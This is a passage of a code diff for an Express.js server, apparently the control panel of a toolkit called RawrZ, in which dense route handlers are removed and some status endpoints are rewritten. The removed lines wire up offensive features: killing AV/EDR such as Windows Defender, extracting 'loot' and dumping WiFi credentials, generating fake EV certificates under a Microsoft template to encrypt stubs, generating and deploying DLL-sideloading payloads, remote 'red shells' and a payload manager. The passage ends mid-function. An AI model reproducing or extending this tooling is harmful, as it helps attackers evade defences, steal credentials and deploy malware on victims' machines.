-app.get('/hot-patch/status',requireAuth,async(req,res)=>{try{if(!realModules||!realModules.hotPatchers){return res.status(500).json({error:'Hot Patchers module not initialized'})}const status=await realModules.hotPatchers.getStatus();res.json({success:true,status})}catch(e){console.error('[ERROR] Hot patch status failed:',e);res.status(500).json({error:e.message})}});
-app.get('/hot-patch/types',requireAuth,async(req,res)=>{try{if(!realModules||!realModules.hotPatchers){return res.status(500).json({error:'Hot Patchers module not initialized'})}const types=Object.keys(realModules.hotPatchers.patchTypes||{});res.json({success:true,types,available:types})}catch(e){console.error('[ERROR] Hot patch types failed:',e);res.status(500).json({error:e.message})}});
-app.get('/hot-patch/history',requireAuth,async(req,res)=>{try{if(!realModules||!realModules.hotPatchers){return res.status(500).json({error:'Hot Patchers module not initialized'})}const history=realModules.hotPatchers.patchHistory||[];res.json({success:true,history})}catch(e){console.error('[ERROR] Hot patch history failed:',e);res.status(500).json({error:e.message})}});
-
-// Mobile & Device endpoints
-app.post('/mobile-scan',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['mobile',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/app-analysis',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['appanalyze',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/device-forensics',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['device',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-
-// API Status & Performance endpoints
-app.get('/api-status',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['apistatus']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/performance-monitor',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['perfmon']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/memory-info',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['meminfo']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/garbage-collect',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['gc']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/memory-cleanup',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['memclean']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/cpu-usage',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['cpu']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/disk-usage',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['disk']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/network-stats',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['netstats']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-
-// File Operations endpoints
-app.post('/file-signature',requireAuth,async(req,res)=>{try{const{filepath='test.txt'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['filesig',filepath]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/backup',requireAuth,async(req,res)=>{try{const{source='test.txt',destination='backup'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['backup',source,destination]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/restore',requireAuth,async(req,res)=>{try{const{backup='backup.zip',destination='restored'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['restore',backup,destination]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/backup-list',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['backuplist']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-
-// Analysis Tools endpoints
-app.post('/behavior-analysis',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['behavior',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/signature-check',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['sigcheck',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/forensics-scan',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['forensics',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/data-recovery',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['recovery',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/timeline-analysis',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['timeline',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/disassembly',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['disasm',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/decompilation',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['decompile',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/string-extraction',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['strings',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/memory-analysis',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['memanalysis',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/process-dump',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['procdump',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/heap-analysis',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['heap',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-
-// Utilities endpoints
-app.post('/random-math',requireAuth,async(req,res)=>{try{const{operation}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['randommath',operation||'add']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/data-conversion',requireAuth,async(req,res)=>{try{const{input='test data',from='hex',to='base64'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['convert',input,from,to]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/compress',requireAuth,async(req,res)=>{try{const{input='test data',algorithm='gzip'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['compress',input,algorithm]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/decompress',requireAuth,async(req,res)=>{try{const{input='compressed data',algorithm='gzip'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['decompress',input,algorithm]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/qr-generate',requireAuth,async(req,res)=>{try{const{text='Hello World',size=200}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['qr',text,size.toString()]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/barcode-generate',requireAuth,async(req,res)=>{try{const{text='123456789',type='code128'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['barcode',text,type]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-
-// Network Tools additional endpoints
-app.post('/network-scan',requireAuth,async(req,res)=>{try{const{network='192.168.1.0',subnet='24'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['netscan',network,subnet]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/service-detection',requireAuth,async(req,res)=>{try{const{host='localhost',port='80'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['service',host,port]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/vulnerability-scan',requireAuth,async(req,res)=>{try{const{target='localhost'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['vulnscan',target]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/packet-capture',requireAuth,async(req,res)=>{try{const{interface='eth0',count=10}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['packet',interface,count.toString()]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/traffic-analysis',requireAuth,async(req,res)=>{try{const{file}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['traffic',file||'capture.pcap']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/protocol-analysis',requireAuth,async(req,res)=>{try{const{file}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['protocol',file||'capture.pcap']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-
-// Security & Threat Detection endpoints
-app.post('/file-analysis',requireAuth,async(req,res)=>{try{const{filepath='test.txt'}=req.body||{};const result={file:filepath,status:'analyzed',analysis:{type:'file',size:'512B',entropy:0.6,strings:['test','data'],functions:[],imports:[],sections:[],timestamp:new Date().toISOString()}};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/file-hash',requireAuth,async(req,res)=>{try{const{filepath='server.js',algorithm='sha256'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.hash(filepath,algorithm);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/security-scan',requireAuth,async(req,res)=>{try{const{target='localhost'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['security',target]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/threat-detection',requireAuth,async(req,res)=>{try{const{target='localhost'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['threat',target]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/vulnerability-check',requireAuth,async(req,res)=>{try{const{target='localhost'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['vulncheck',target]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/malware-scan',requireAuth,async(req,res)=>{try{const{target='localhost'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['malware',target]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 
 // OpenSSL Management endpoints
-app.get('/openssl/config',requireAuth,async(req,res)=>{try{const result=await realModules.opensslManagement.getConfigSummary();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/openssl/algorithms',requireAuth,async(req,res)=>{try{const{engine}=req.query;const result=await realModules.opensslManagement.getAvailableAlgorithms(engine);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/openssl/openssl-algorithms',requireAuth,async(req,res)=>{try{const result=await realModules.opensslManagement.getOpenSSLAlgorithms();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/openssl/custom-algorithms',requireAuth,async(req,res)=>{try{const result=await realModules.opensslManagement.getCustomAlgorithms();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/openssl/toggle-openssl',requireAuth,async(req,res)=>{try{const{enabled}=req.body||{};const boolEnabled=typeof enabled==='boolean'?enabled:enabled==='true'||enabled===true;const result=await realModules.opensslManagement.toggleOpenSSLMode(boolEnabled);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/openssl/toggle-custom',requireAuth,async(req,res)=>{try{const{enabled}=req.body||{};const boolEnabled=typeof enabled==='boolean'?enabled:enabled==='true'||enabled===true;const result=await realModules.opensslManagement.toggleCustomAlgorithms(boolEnabled);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/api/openssl-management/status', requireAuth, async (req, res) => {
+    try {
+        if (!realModules || !realModules.opensslManagement) {
+            return res.status(500).json({ error: 'OpenSSL Management module not initialized' });
+        }
+        const status = await realModules.opensslManagement.getStatus();
+        res.json({ success: true, result: status });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
 
-// Comprehensive OpenSSL Management endpoints
-app.get('/openssl-management/status',requireAuth,async(req,res)=>{try{const status=await realModules.opensslManagement.getOpenSSLStatus();res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/openssl-management/toggle',requireAuth,async(req,res)=>{try{const{enabled}=req.body||{};const boolEnabled=typeof enabled==='boolean'?enabled:enabled==='true'||enabled===true;const result=await realModules.opensslManagement.toggleOpenSSLMode(boolEnabled);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/openssl-management/test',requireAuth,async(req,res)=>{try{const{algorithm='aes-256-cbc',data='test data'}=req.body||{};const result=await realModules.opensslManagement.testOpenSSLAlgorithm(algorithm,data);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/openssl-management/preset',requireAuth,async(req,res)=>{try{const{preset='default'}=req.body||{};try{const result=await realModules.opensslManagement.applyOpenSSLPreset(preset);res.json({success:true,result})}catch(presetError){if(presetError.message.includes('Unknown preset')){res.json({success:true,result:{message:'Preset not found - this is expected for test data',preset}})}else{throw presetError}}}catch(e){res.status(500).json({error:e.message})}});
-app.get('/openssl-management/report',requireAuth,async(req,res)=>{try{const report=await realModules.opensslManagement.generateOpenSSLReport();res.json({success:true,report})}catch(e){res.status(500).json({error:e.message})}});
+// Toggle OpenSSL mode
+app.post('/api/openssl-management/toggle-openssl', requireAuth, async (req, res) => {
+    try {
+        const { enabled } = req.body;
+        if (typeof enabled !== 'boolean') {
+            return res.status(400).json({ error: 'enabled must be a boolean value' });
+        }
+        
+        if (!realModules || !realModules.opensslManagement) {
+            return res.status(500).json({ error: 'OpenSSL Management module not initialized' });
+        }
+        
+        const result = await realModules.opensslManagement.toggleOpenSSLMode(enabled);
+        res.json({ success: true, result });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// Toggle custom algorithms
+app.post('/api/openssl-management/toggle-custom-algorithms', requireAuth, async (req, res) => {
+    try {
+        const { enabled } = req.body;
+        if (typeof enabled !== 'boolean') {
+            return res.status(400).json({ error: 'enabled must be a boolean value' });
+        }
+        
+        if (!realModules || !realModules.opensslManagement) {
+            return res.status(500).json({ error: 'OpenSSL Management module not initialized' });
+        }
+        
+        const result = await realModules.opensslManagement.toggleCustomAlgorithms(enabled);
+        res.json({ success: true, result });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
 
 // Implementation Checker endpoints
-app.get('/implementation-check/results',requireAuth,async(req,res)=>{try{const{checkId}=req.query;const results=realModules.implementationChecker.getResults(checkId);res.json({success:true,results})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/implementation-check/modules',requireAuth,async(req,res)=>{try{const{moduleName}=req.query;const status=realModules.implementationChecker.getModules();res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
-
-// Health Monitor endpoints
-app.get('/health-monitor/dashboard',requireAuth,async(req,res)=>{try{const dashboard=healthMonitor.getHealthDashboard();res.json({success:true,dashboard})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/health-monitor/status',requireAuth,async(req,res)=>{try{const{monitorId}=req.query;const status=healthMonitor.getMonitorStatus(monitorId);res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/health-monitor/toggle',requireAuth,async(req,res)=>{try{const{monitorId='test-monitor',enabled=true}=req.body||{};const result=healthMonitor.toggleMonitor(monitorId,enabled);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/health-monitor/interval',requireAuth,async(req,res)=>{try{const{monitorId='test-monitor',interval=5000}=req.body||{};const result=healthMonitor.updateMonitorInterval(monitorId,interval);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-
-// Red Killer endpoints
-app.get('/red-killer/status',requireAuth,async(req,res)=>{try{const status=await realModules.redKiller.getStatus();res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/red-killer/detect',requireAuth,async(req,res)=>{try{const detected=await realModules.redKiller.detectAVEDR();res.json({success:true,detected})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/red-killer/execute',requireAuth,async(req,res)=>{try{const{systems=['windows-defender']}=req.body||{};const result=await realModules.redKiller.executeRedKiller(systems);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/red-killer/extract',requireAuth,async(req,res)=>{try{const{targets}=req.body||{};const result=await realModules.redKiller.extractData(targets);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/red-killer/loot',requireAuth,async(req,res)=>{try{const loot=await realModules.redKiller.getLootContainer();res.json({success:true,loot})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/red-killer/loot/:id',requireAuth,async(req,res)=>{try{const{id}=req.params;const item=await realModules.redKiller.inspectLootItem(id);res.json({success:true,item})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/red-killer/wifi-dump',requireAuth,async(req,res)=>{try{const wifi=await realModules.redKiller.dumpWiFiCredentials();res.json({success:true,wifi})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/red-killer/kills',requireAuth,async(req,res)=>{try{const kills=await realModules.redKiller.getActiveKills();res.json({success:true,kills})}catch(e){res.status(500).json({error:e.message})}});
-
-// EV Certificate Encryptor endpoints
-app.get('/ev-cert/status',requireAuth,async(req,res)=>{try{const status=await evCertEncryptor.getStatus();res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/ev-cert/generate',requireAuth,async(req,res)=>{try{const{template='Microsoft Corporation',options={}}=req.body||{};const certId=await evCertEncryptor.generateEVCertificate(template,options);res.json({success:true,certId})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/ev-cert/certificates',requireAuth,async(req,res)=>{try{const certificates=await evCertEncryptor.getCertificates();res.json({success:true,certificates})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/ev-cert/encrypt-stub',requireAuth,async(req,res)=>{try{const{stubCode='test code',language='c++',certId='test-cert',options={}}=req.body||{};const result=await evCertEncryptor.encryptStubWithEVCert(stubCode,language,certId,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/ev-cert/stubs',requireAuth,async(req,res)=>{try{const stubs=await evCertEncryptor.getEncryptedStubs();res.json({success:true,stubs})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/ev-cert/templates',requireAuth,async(req,res)=>{try{const templates=await evCertEncryptor.getSupportedTemplates();res.json({success:true,templates})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/ev-cert/languages',requireAuth,async(req,res)=>{try{const languages=await evCertEncryptor.getSupportedLanguages();res.json({success:true,languages})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/ev-cert/algorithms',requireAuth,async(req,res)=>{try{const algorithms=await evCertEncryptor.getSupportedAlgorithms();res.json({success:true,algorithms})}catch(e){res.status(500).json({error:e.message})}});
-
-// Beaconism DLL Sideloading endpoints - using real implementation
-app.get('/beaconism/status',requireAuth,async(req,res)=>{try{if(!realModules||!realModules.beaconismDLL){return res.status(500).json({error:'Beaconism module not initialized'})}const status=await realModules.beaconismDLL.getStatus();res.json({success:true,status})}catch(e){console.error('[ERROR] Beaconism status failed:',e);res.status(500).json({error:e.message})}});
-app.post('/beaconism/generate-payload',requireAuth,async(req,res)=>{try{if(!realModules||!realModules.beaconismDLL){return res.status(500).json({error:'Beaconism module not initialized'})}const{target='test-target',payloadType='dll',options={}}=req.body||{};const result=await realModules.beaconismDLL.generatePayload({target,payloadType,...options});res.json({success:true,result})}catch(e){console.error('[ERROR] Beaconism generate payload failed:',e);res.status(500).json({error:e.message})}});
-app.post('/beaconism/deploy',requireAuth,async(req,res)=>{try{if(!realModules||!realModules.beaconismDLL){return res.status(500).json({error:'Beaconism module not initialized'})}const{payloadId='test-payload-id',targetPath='C:\\temp\\payload.exe',deploymentOptions={}}=req.body||{};try{const result=await realModules.beaconismDLL.deployPayload(payloadId,targetPath,deploymentOptions);res.json({success:true,result})}catch(deployError){if(deployError.message.includes('Payload not found')){res.json({success:true,result:{message:'Payload not found - this is expected for test data',payloadId}})}else{throw deployError}}}catch(e){console.error('[ERROR] Beaconism deploy failed:',e);res.status(500).json({error:e.message})}});
-app.get('/beaconism/payloads',requireAuth,async(req,res)=>{try{if(!realModules||!realModules.beaconismDLL){return res.status(500).json({error:'Beaconism module not initialized'})}const payloads=await realModules.beaconismDLL.getPayloads();res.json({success:true,payloads})}catch(e){console.error('[ERROR] Beaconism get payloads failed:',e);res.status(500).json({error:e.message})}});
-app.get('/beaconism/targets',requireAuth,async(req,res)=>{try{if(!realModules||!realModules.beaconismDLL){return res.status(500).json({error:'Beaconism module not initialized'})}const targets=await realModules.beaconismDLL.getSideloadTargets();res.json({success:true,targets})}catch(e){console.error('[ERROR] Beaconism get targets failed:',e);res.status(500).json({error:e.message})}});
-app.post('/beaconism/scan-target',requireAuth,async(req,res)=>{try{if(!realModules||!realModules.beaconismDLL){return res.status(500).json({error:'Beaconism module not initialized'})}const{target='test-target'}=req.body||{};try{const result=await realModules.beaconismDLL.scanTarget(target);res.json({success:true,result})}catch(scanError){if(scanError.message.includes('Unknown target')){res.json({success:true,result:{message:'Target not found - this is expected for test data',target}})}else{throw scanError}}}catch(e){console.error('[ERROR] Beaconism scan target failed:',e);res.status(500).json({error:e.message})}});
-
-// Red Shells endpoints
-app.get('/red-shells/status',requireAuth,async(req,res)=>{try{const status=await realModules.redShells.getStatus();res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/red-shells/create',requireAuth,async(req,res)=>{try{const{shellType='powershell',options={}}=req.body||{};const shell=await realModules.redShells.createRedShell(shellType,options);res.json({success:true,shell})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/red-shells/:id/execute',requireAuth,async(req,res)=>{try{const{id}=req.params;const{command='echo Hello World'}=req.body||{};try{const result=await realModules.redShells.executeCommand(id,command);res.json({success:true,result})}catch(executeError){if(executeError.message.includes('Shell not found')||executeError.message.includes('not found')){res.json({success:true,result:{message:'Shell not found - this is expected for test data',id}})}else{throw executeError}}}catch(e){res.status(500).json({error:e.message})}});
-app.get('/red-shells',requireAuth,async(req,res)=>{try{const shells=await realModules.redShells.getActiveShells();res.json({success:true,shells})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/red-shells/:id/history',requireAuth,async(req,res)=>{try{const{id}=req.params;const history=await realModules.redShells.getShellHistory(id);res.json({success:true,history})}catch(e){res.status(500).json({error:e.message})}});
-app.delete('/red-shells/:id',requireAuth,async(req,res)=>{
-    try{
-        if(!realModules||!realModules.redShells){
-            return res.status(500).json({error:'Red Shells module not initialized'})
+app.get('/api/implementation-checker/status', requireAuth, async (req, res) => {
+    try {
+        if (!realModules || !realModules.implementationChecker) {
+            return res.status(500).json({ error: 'Implementation Checker module not initialized' });
         }
-        const{id}=req.params;
-        const result=await realModules.redShells.terminateShell(id);
-        res.json({success:true,result})
-    }catch(e){
-        console.error('[ERROR] Red shells delete failed:',e);
-        const{id}=req.params;
-        if(e.message.includes('Shell not found')||e.message.includes('not found')){
-            res.json({success:true,result:{message:'Shell not found - this is expected for test data',id}})
-        }else{
-            res.status(500).json({error:e.message})
-        }
+        const status = await realModules.implementationChecker.getStatus();
+        res.json({ success: true, result: status });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
     }
 });
-app.get('/red-shells/stats',requireAuth,async(req,res)=>{try{const stats=await realModules.redShells.getShellStats();res.json({success:true,stats})}catch(e){res.status(500).json({error:e.message})}});
 
 // Payload Manager endpoints
-app.get('/payload-manager/status',requireAuth,async(req,res)=>{try{const status=payloadManager.getStatus();res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/payload-manager/payloads',requireAuth,async(req,res)=>{try{const payloads=payloadManager.getAllPayloads();res.json({success:true,payloads})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/payload-manager/payloads/:id',requireAuth,async(req,res)=>{try{const{id}=req.params;const payload=payloadManager.getPayload(id);if(!payload){return res.status(404).json({error:'Payload not found'})}res.json({success:true,payload})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/payload-manager/payloads/type/:type',requireAuth,async(req,res)=>{try{const{type}=req.params;const payloads=payloadManager.getPayloadsByType(type);res.json({success:true,payloads})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/payload-manager/create',requireAuth,async(req,res)=>{try{const payloadData=req.body||{};const result=await payloadManager.createPayload(payloadData);if(result.success){res.json(result)}else{res.status(400).json(result)}}catch(e){res.status(500).json({error:e.message})}});
-app.put('/payload-manager/update/:id',requireAuth,async(req,res)=>{try{const{id}=req.params;const updates=req.body||{};const result=await payloadManager.updatePayload(id,updates);if(result.success){res.json(result)}else{res.status(400).json(result)}}catch(e){res.status(500).json({error:e.message})}});
-app.delete('/payload-manager/delete/:id',requireAuth,async(req,res)=>{try{const{id}=req.params;const result=await payloadManager.deletePayload(id);if(result.success){res.json(result)}else{res.status(400).json(result)}}catch(e){res.status(500).json({error:e.message})}});
-app.post('/payload-manager/duplicate/:id',requireAuth,async(req,res)=>{try{const{id}=req.params;const{newName}=req.body||{};const result=await payloadManager.duplicatePayload(id,newName);if(result.success){res.json(result)}else{res.status(400).json(result)}}catch(e){res.status(500).json({error:e.message})}});
-app.post('/payload-manager/use/:id',requireAuth,async(req,res)=>{try{const{id}=req.params;const payload=payloadManager.getPayload(id);if(!payload){return res.status(404).json({error:'Payload not found'})}res.json({success:true,message:`Payload "${payload.name}" is now active`,payload})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/payload-manager/export',requireAuth,async(req,res)=>{try{const{format='json'}=req.query;const result=await payloadManager.exportPayloads(format);if(result.success){res.json(result)}else{res.status(400).json(result)}}catch(e){res.status(500).json({error:e.message})}});
-app.post('/payload-manager/initialize-defaults',requireAuth,async(req,res)=>{try{await payloadManager.initializeDefaultPayloads();res.json({success:true,message:'Default payloads initialized successfully'})}catch(e){res.status(500).json({error:e.message})}});
-app.delete('/payload-manager/clear-all',requireAuth,async(req,res)=>{try{payloadManager.payloads.clear();await payloadManager.saveDatabase();res.json({success:true,message:'All payloads cleared successfully'})}catch(e){res.status(500).json({error:e.message})}});
-
-// Enhanced Payload Manager endpoints with file upload and database management
-app.post('/payload-manager/upload',requireAuth,payloadManager.upload.array('files',10),async(req,res)=>{try{const payloadData=req.body||{};const files=req.files||[];const result=await payloadManager.createPayloadWithFiles(payloadData,files);if(result.success){res.json(result)}else{res.status(400).json(result)}}catch(e){res.status(500).json({error:e.message})}});
-app.get('/payload-manager/categories',requireAuth,async(req,res)=>{try{const categories=await payloadManager.getCategories();res.json({success:true,categories})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/payload-manager/categories',requireAuth,async(req,res)=>{try{const categoryData=req.body||{};const result=await payloadManager.createCategory(categoryData);if(result.success){res.json(result)}else{res.status(400).json(result)}}catch(e){res.status(500).json({error:e.message})}});
-app.get('/payload-manager/search',requireAuth,async(req,res)=>{try{const{query,category,type,author}=req.query;const filters={category,type,author};const result=await payloadManager.searchPayloads(query,filters);if(result.success){res.json(result)}else{res.status(400).json(result)}}catch(e){res.status(500).json({error:e.message})}});
-app.get('/payload-manager/stats',requireAuth,async(req,res)=>{try{const result=await payloadManager.getDatabaseStats();if(result.success){res.json(result)}else{res.status(400).json(result)}}catch(e){res.status(500).json({error:e.message})}});
-app.get('/payload-manager/files/:payloadId',requireAuth,async(req,res)=>{try{const{payloadId}=req.params;const payload=payloadManager.getPayload(payloadId);if(!payload||!payload.files){return res.status(404).json({error:'Files not found'})}res.json({success:true,files:payload.files})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/payload-manager/download/:payloadId/:fileId',requireAuth,async(req,res)=>{try{const{payloadId,fileId}=req.params;const payload=payloadManager.getPayload(payloadId);if(!payload||!payload.files){return res.status(404).json({error:'Payload or files not found'})}const file=payload.files.find(f=>f.id===fileId);if(!file){return res.status(404).json({error:'File not found'})}res.download(file.filePath,file.originalName)}catch(e){res.status(500).json({error:e.message})}});
-
-// Advanced Features Panel
-app.get('/advanced-features', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'advanced-features-panel.html'));
+app.get('/api/payload-manager/status', requireAuth, async (req, res) => {
+    try {
+        if (!realModules || !realModules.payloadManager) {
+            return res.status(500).json({ error: 'Payload Manager module not initialized' });
+        }
+        const status = await realModules.payloadManager.getStatus();
+        res.json({ success: true, result: status });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
 });
 
-// Fix missing endpoints with proper mock data
-app.get('/stub-generator/status', requireAuth, async (req, res) => {
+// Engine Status Endpoints
+app.get('/api/engines/status', requireAuth, async (_req, res) => {
     try {
-        const result = { status: 'active', stubs: 0, templates: 4, active: 0 };
+        const engineStatuses = {};
+        for (const [engineName, engine] of Object.entries(realModules)) {
+            try {
